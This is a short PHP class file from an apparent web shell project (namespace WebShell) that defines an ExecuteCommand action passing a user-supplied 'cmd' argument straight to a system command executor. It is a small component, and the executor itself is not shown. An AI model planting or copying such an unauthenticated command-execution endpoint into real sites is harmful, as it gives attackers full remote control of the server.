<?php
namespace WebShell;

class ExecuteCommand implements Action
{
    public function run($args)
    {
        // Get SystemService instance and run the command
        $instance = SystemService::getInstance();
        return $instance->execute($args['cmd']);
    }
}
?>
